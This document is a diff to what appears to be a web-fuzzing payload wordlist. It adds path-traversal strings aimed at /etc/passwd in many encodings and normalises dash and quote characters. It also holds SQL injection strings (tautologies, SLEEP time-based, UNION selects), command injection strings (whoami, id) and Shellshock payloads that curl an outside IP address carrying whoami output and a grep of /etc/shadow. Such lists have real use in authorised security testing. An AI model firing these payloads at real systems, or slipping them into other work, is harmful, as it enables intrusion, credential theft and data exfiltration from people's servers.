@@ -1,4 +1,37 @@
- + SLEEP(10) + '
+' or '1'='1'--
+ ../etc/passwd
+..\etc/passwd
+..\/etc\/passwd
+%2e%2e%2fetc%2fpasswd
+%252e%252e%252fetc%252fpasswd
+%c0%ae%c0%ae%c0%afetc%c0%afpasswd
+%uff0e%uff0e%u2215etc%u2215passwd
+%uff0e%uff0e%u2216etc%u2216passwd
+../../etc/passwd
+..\..\etc/passwd
+..\/..\/etc\/passwd
+%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%252e%252e%252f%252e%252e%252fetc%252fpasswd
+%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd
+%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc%u2215passwd
+%uff0e%uff0e%u2216%uff0e%uff0e%u2216etc%u2216passwd
+../../../etc/passwd
+..\..\..\etc/passwd
+..\/..\/..\/etc\/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd
+%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc%u2215passwd
+%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216etc%u2216passwd
+../../../../etc/passwd
+..\..\..\..\etc/passwd
+..\/..\/..\/..\/etc\/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd
+%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc%u2215passwd
+%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216etc%u2216passwd
++ SLEEP(10) + '
  AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
  AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
  AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
@@ -18,17 +51,17 @@
  RANDOMBLOB(500000000/2)
  SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
  and 1=1
- and 1=1–
+ and 1=1-
  curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\" |curl https://crowdshield.com/.testing/rce_vuln.txt
  like '%'
  or 0=0 #
  or 0=0 --
- or 0=0 –
+ or 0=0 -
  or 1=1
  or 1=1#
  or 1=1--
  or 1=1/*
- or 1=1–
+ or 1=1-
  or SLEEP(5)
  or SLEEP(5)#
  or SLEEP(5)--
@@ -60,14 +93,14 @@
 " or "x"="x
 " or 0=0 #
 " or 0=0 --
-" or 0=0 –
+" or 0=0 -
 " or 1=1
 " or 1=1 --
-" or 1=1 –
+" or 1=1 -
 " or 1=1#
 " or 1=1--
 " or 1=1/*
-" or 1=1–
+" or 1=1-
 " whoami
 " | whoami
 " || whoami
@@ -161,7 +194,6 @@ ${@print(system($_SERVER['HTTP_USER_AGENT']))}
 & wget http://crowdshield.com/.testing/rce.txt
 & whoami
 && 
-&& 
 && curl https://crowdshield.com/.testing/rce_vuln.txt
 && dir
 && dir C:\
@@ -216,8 +248,6 @@ ${@print(system($_SERVER['HTTP_USER_AGENT']))}
 &&id
 &&type C:\\boot.ini
 '
-'
-'
 ' #
 ' & whoami
 ' && whoami
@@ -229,7 +259,7 @@ ${@print(system($_SERVER['HTTP_USER_AGENT']))}
 ' UNION ALL SELECT system_user(),user();#
 ' UNION select table_schema,table_name FROM information_Schema.tables;#
 ' and 'one'='one
-' and 'one'='one–
+' and 'one'='one-
 ' and 1='1
 ' and a='a
 ' and substring(password/text(),1,1)='7
@@ -240,28 +270,26 @@ ${@print(system($_SERVER['HTTP_USER_AGENT']))}
 ' or ''='
 ' or '1'='1
 ' or '1'='1'#
-' or '1'='1'--
 ' or '1'='1'/*
-' or '1′='1
+' or '1'='1
 ' or 'a'='a
 ' or 'one'='one
-' or 'one'='one–
+' or 'one'='one-
 ' or 'x'='x
 ' or 0=0 #
 ' or 0=0 --
-' or 0=0 –
+' or 0=0 -
 ' or 1=1
 ' or 1=1 --
 ' or 1=1 LIMIT 1;#
-' or 1=1 –
+' or 1=1 -
 ' or 1=1#
-' or 1=1--
 ' or 1=1--
 ' or 1=1/*
 ' or 1=1;#
-' or 1=1–
+' or 1=1-
 ' or a=a--
-' or a=a–
+' or a=a-
 ' or uid like '%
 ' or uname like '%
 ' or user like '%
@@ -269,7 +297,7 @@ ${@print(system($_SERVER['HTTP_USER_AGENT']))}
 ' or username like '%
 ' whoami
 ' || whoami
-' –
+' -
 '"
 '#
 '&&SLEEP(5)&&'1
@@ -294,7 +322,7 @@ ${@print(system($_SERVER['HTTP_USER_AGENT']))}
 '\"
 'or 1=1 or ''='
 'or'1=1
-'or'1=1′
+'or'1=1'
 () { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`"
 () { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`"
 () { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`"
@@ -323,8 +351,8 @@ ${@print(system($_SERVER['HTTP_USER_AGENT']))}
 (SELECT * FROM (SELECT(SLEEP(5)))ecMj)
 (SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
 (SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
-) or '1′='1–
-) or ('1′='1–
+) or '1'='1-
+) or ('1'='1-
 *; ls -lhtR /var/www/
 +benchmark(3200,SHA1(1))+'
 -- 
@@ -336,7 +364,7 @@ ${@print(system($_SERVER['HTTP_USER_AGENT']))}
 /etc/passwd
 /etc/passwd%00
 /index.html|id|
-1′) and '1′='1–
+1') and '1'='1-
 :phpversion();
 ;
 ; 
@@ -648,7 +676,6 @@ whoami
 | whoami
 |/usr/bin/id
 |id
-|| 
 || 
 || perl -e 'print "X"x16096'
 || perl -e 'print "X"x4096'
